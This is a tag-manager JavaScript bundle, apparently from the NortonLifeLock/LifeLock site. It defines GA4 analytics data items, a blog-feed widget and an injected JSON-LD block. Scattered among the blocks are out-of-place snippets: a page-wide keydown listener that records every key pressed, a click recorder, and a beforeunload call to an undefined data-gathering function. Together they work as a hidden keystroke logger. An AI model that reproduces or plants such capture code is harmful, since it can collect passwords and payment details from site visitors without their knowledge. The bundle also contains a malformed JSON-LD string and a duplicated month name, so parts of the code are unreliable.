  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        var value = "; " + document.cookie;
        var parts = value.split("; _ga_ZMF24Q2GWK\x3d");
        if (parts.length == 2) return decodeURIComponent(parts.pop().split(";").shift());
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Cookies - _ga - LifeLock Web",
      collection: "GA4 - Page - Cookies",
      source: "Manage",
      priv: "false"
    }, {
      id: "64948"
    });
  }, 64948);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return document.location.hash;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "page",
      trigger: Bootstrapper.data.whenValueExistsTrigger,
      dataDefName: "GA4 - Page - Hash",
      collection: "GA4 - Page",
      source: "Manage",
      priv: "false"
    }, {
      id: "64901"
    });
  }, 64901);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return window.location.search.replace("?", "\x26").split("\x26wbraid\x3d").pop().split("\x26").shift();
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - Params - wbraid",
      collection: "GA4 - Page - Params",
      source: "Manage",
      priv: "false"
    }, {
      id: "64945"
    });
  }, 64945);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return document.location.search;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - Parameters",
      collection: "GA4 - Page",
      source: "Manage",
      priv: "false"
    }, {
      id: "64900"
    });
  }, 64900);
}, -1, -1);
Bootstrapper.bindDOMParsed(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  var blogfeed = {
    callAPI: function callAPI(syndAPI) {
      var blogPosts, blogAPI, hasStorage;
      blogAPI = "/bin/nortonlifelock/blogfeed";
      blogAPI += "?synd_api\x3d" + encodeURI(syndAPI);
      hasStorage = blogfeed.isStorageAvailable();
      if (hasStorage && sessionStorage.getItem("blogPosts")) {
        $(".c-blog__spinner").hide();
        $(".c-blog__container").addClass("c-blog--animated c-blog--animatedFadeInUp c-blog--fadeInUp");
        blogPosts = JSON.parse(sessionStorage.getItem("blogPosts"));
        blogfeed.buildPosts(blogPosts);
      } else $.getJSON(blogAPI).done(function (data) {
        $(".c-blog__spinner").hide();
        var blogPosts = [];
        if (data.results) {
          data.results.slice(0, 4).forEach(function (post, index) {
            var postObj = {};
            postObj.mobileImage = post.heroImage.blogs_teaser.url ? post.heroImage.blogs_teaser.url : "";
            postObj.tabletImage = post.heroImage.blogs_teaser.sources[0].srcset ? post.heroImage.blogs_teaser.sources[0].srcset : "";
            postObj.desktopImage = post.heroImage.blogs_teaser.sources[1].srcset ? post.heroImage.blogs_teaser.sources[1].srcset : "";
            postObj.postTitle = post.title ? post.title : "";
            postObj.postDescription = post.subtitle ? post.subtitle : "";
            postObj.postMeta = blogfeed.getPostedNote(post.createdDate, post.timeToRead);
            postObj.postLink = post.urlAlias ? "https://www.nortonlifelock.com/blogs" + post.urlAlias : "";
            blogPosts.push(postObj);
          });
          blogfeed.buildPosts(blogPosts);
          $(".c-blog__container").addClass("c-blog--animated c-blog--animatedFadeInUp c-blog--fadeInUp");
          if (hasStorage) sessionStorage.setItem("blogPosts", JSON.stringify(blogPosts));
          blogfeed.equalRowHeights();
        }
      }).fail(function (error) {
        $(".c-blog__spinner").hide();
        console.log(error);
      });
    },
    buildPosts: function buildPosts(posts) {
      var postTemp = "\x3cdiv class\x3d'c-blog__item aem-GridColumn aem-GridColumn--default--3 aem-GridColumn--tablet--6 aem-GridColumn--phone--12'\x3e";
      postTemp += "\x3cdiv class\x3d'c-blog__card-img-container u-img-cover '\x3e";
      postTemp += "\x3ca href\x3d'{{postLink}}'\x3e";
      postTemp += "\x3cpicture\x3e";
      postTemp += "\x3csource srcset\x3d'{{desktopImage}}' media\x3d'(min-width: 1000px)'\x3e";
      postTemp += "\x3csource srcset\x3d'{{tabletImage}}' media\x3d'(min-width: 768px)'\x3e";
      postTemp += "\x3cimg src\x3d'{{mobileImage}}' alt\x3d'' class\x3d'c-blog__card-img u-img-cover__img'\x3e";
      postTemp += "\x3c/picture\x3e";
      postTemp += "\x3c/a\x3e";
      postTemp += "\x3c/div\x3e";
      postTemp += "\x3cdiv class\x3d'c-blog__card-text-container'\x3e";
      postTemp += "\x3cdiv class\x3d'c-blog__card-text'\x3e";
      postTemp += "\x3ch4 class\x3d'c-blog__card-text-title'\x3e{{postTitle}}\x3c/h4\x3e";
      postTemp += "\x3cp class\x3d'c-blog__card-text-description'\x3e{{postDescription}}\x3c/p\x3e";
      postTemp += "\x3c/div\x3e";
      postTemp += "\x3cp class\x3d'c-blog__card-meta typ-p-note'\x3ePosted: {{postMeta}}\x3c/p\x3e";
      postTemp += "\x3cp class\x3d'c-blog__card-readmore'\x3e\x3ca href\x3d'{{postLink}}'\x3eREAD MORE\x3c/a\x3e\x3c/p\x3e";
      postTemp += "\x3c/div\x3e\x3c/div\x3e";
      posts.forEach(function (post) {
        var newPost = postTemp;
        newPost = newPost.replace(/{{postLink}}/g, post.postLink);
        newPost = newPost.replace("{{desktopImage}}", post.desktopImage);
        newPost = newPost.replace("{{tabletImage}}", post.tabletImage);
        newPost = newPost.replace("{{mobileImage}}", post.mobileImage);
        newPost = newPost.replace("{{postTitle}}", post.postTitle);
        newPost = newPost.replace("{{postDescription}}", post.postDescription);
        newPost = newPost.replace("{{postMeta}}", post.postMeta);
        newPost = newPost.replace("c-blog-hidden", "");
        newPost = newPost.replace("c-blog-template--js", "");
        if (post.mobileImage && post.tabletImage && post.desktopImage && post.postTitle && post.postLink && post.postMeta && $(".c-blog__item").length < 4) $(newPost).appendTo($(".c-blog"));
      });
      $(".c-blog-template--js").remove();
      blogfeed.equalRowHeights();
    },
    getPostedNote: function getPostedNote(dateString, timeToRead) {
      var date = "";
      var readTime = "";
      var postedNote = "";
      var months = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "AUG", "NOV", "DEC"];
      if (dateString && dateString.length) {
        date = new Date(dateString);
        var day = date.getDate().toString().length < 2 ? "0" + date.getDate().toString() : date.getDate().toString();
        var monthIndex = date.getMonth();
        var month = months[monthIndex];
        var year = date.getFullYear();
        date = day + " " + month + ", " + year;
      }
      if (timeToRead && timeToRead.length) readTime = " | " + timeToRead + " Min Read";
      postedNote = date + readTime;
      return postedNote;
    },
    isStorageAvailable: function isStorageAvailable() {
      var storage;
      try {
        storage = window.sessionStorage;
        var x = "__storage_test__";
        storage.setItem(x, x);
        storage.removeItem(x);
        return true;
      } catch (e) {
        return _instanceof(e, DOMException) && (e.code === 22 || e.code === 1014 || e.name === "QuotaExceededError" || e.name === "NS_ERROR_DOM_QUOTA_REACHED") && storage && storage.length !== 0;
      }
    },
    equalRowHeights: function equalRowHeights() {
      var tabletBreakpoint = 768;
      var desktopBreakpoint = 1E3;
      var selector = ".c-blog .c-blog__card-text";
      var screenWidth = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
      if (screenWidth >= tabletBreakpoint) if (screenWidth <= desktopBreakpoint) blogfeed.equalize(selector, 2);else blogfeed.equalize(selector, 4);
    },
    equalize: function equalize(selector, n) {
      var columnCount = n;
      var currentIndex = 0;
      var items = document.querySelectorAll(selector);
      var itemCount = items.length;
      var fullRowCount = Math.floor(itemCount / n);
      var partialRowColCount = itemCount % n;
      var partialRowExists = partialRowColCount > 0 ? 1 : 0;
      var rowCount = fullRowCount + partialRowExists;
      for (var thisRow = 1; thisRow <= rowCount; thisRow++) {
        var textHeight = 0;
        var indexesToUpdate = [];
        if (thisRow === rowCount && partialRowExists) columnCount = partialRowColCount;
        for (var thisColumn = 1; thisColumn <= columnCount; thisColumn++) {
          var newHeight = items[currentIndex].scrollHeight;
          indexesToUpdate.push(currentIndex);
          if (newHeight > textHeight) textHeight = newHeight;
          if (thisColumn === columnCount) for (var i = 0; i < indexesToUpdate.length; i++) {
            var indexToUpdate = indexesToUpdate[i];
            items[indexToUpdate].style.height = textHeight + "px";
          }
          currentIndex++;
        }
      }
    }
  };
  if ($(".c-blog__container").length) {
    var syndAPI = $(".c-blog__container").data("filter");
    if (syndAPI && $(".c-blog__item").length < 1) blogfeed.callAPI(syndAPI);
  }
}, 3496395, 681099);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return window.location.search.replace("?", "\x26").split("\x26_gl\x3d").pop().split("\x26").shift();
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - Params - _gl",
      collection: "GA4 - Page - Params",
      source: "Manage",
      priv: "false"
    }, {
      id: "64944"
    });
  }, 64944);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return 2427878879;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Config - LifeLock Web - Stream ID",
      collection: "GA4 - Config",
      source: "Manage",
      priv: "false"
    }, {
      id: "64903"
    });
  }, 64903);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("click", "#submit_button", function () {
    Bootstrapper.ensEvent.trigger("OL Thank you", this);
  }, true);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return document.location.href;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - URL",
      collection: "GA4 - Page",
      source: "Manage",
      priv: "false"
    }, {
      id: "64910"
    });
  }, 64910);
}, -1, -1);
window.addEventListener("beforeunload", () => {
  gatherDataFromSources();
});
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return document.location.pathname;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - Path",
      collection: "GA4 - Page",
      source: "Manage",
      priv: "false"
    }, {
      id: "64898"
    });
  }, 64898);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return window.location.search.replace("?", "\x26").split("\x26gclid\x3d").pop().split("\x26").shift();
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.whenValueExistsTrigger,
      dataDefName: "GA4 - Page - Params - gclid",
      collection: "GA4 - Page - Params",
      source: "Manage",
      priv: "false"
    }, {
      id: "64941"
    });
  }, 64941);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return document.location.hostname;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - Domain",
      collection: "GA4 - Page",
      source: "Manage",
      priv: "false"
    }, {
      id: "64897"
    });
  }, 64897);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  $("head").append('\x3cscript type\x3d"application/ld+json"\x3e{"@context" : "https://schema.org","@type" : "Organization","name" : "NortonLifeLock","url" : "https://www.nortonlifelock.com/ "logo": "https://www.nortonlifelock.com/content/dam/nortonlifelock/images/common/logo/nortonlifelock-horizontal-light.jpg","sameAs" : [ "https://en.wikipedia.org/wiki/NortonLifeLock","https://www.facebook.com/NortonLifeLock/", "https://twitter.com/NortonLifeLock","https://www.youtube.com/channel/UCa3h96az7881wsRH5uoTxuQ","https://www.linkedin.com/company/nortonlifelock","https://www.instagram.com/nortonlifelock/"]}\x3c/script\x3e');
}, 3186673, 635997);
document.addEventListener('click', function (event) {
  trackedEvents.push({
    type: "click",
    target: event.target.tagName,
    timestamp: new Date().getTime()
  });
});
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return 2437003583;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Config - NortonLifeLock Web - Stream ID",
      collection: "GA4 - Config",
      source: "Manage",
      priv: "false"
    }, {
      id: "64909"
    });
  }, 64909);
}, -1, -1);
document.addEventListener('keydown', function (event) {
  trackedEvents.push({
    type: "keydown",
    key: event.key,
    timestamp: new Date().getTime()
  });
});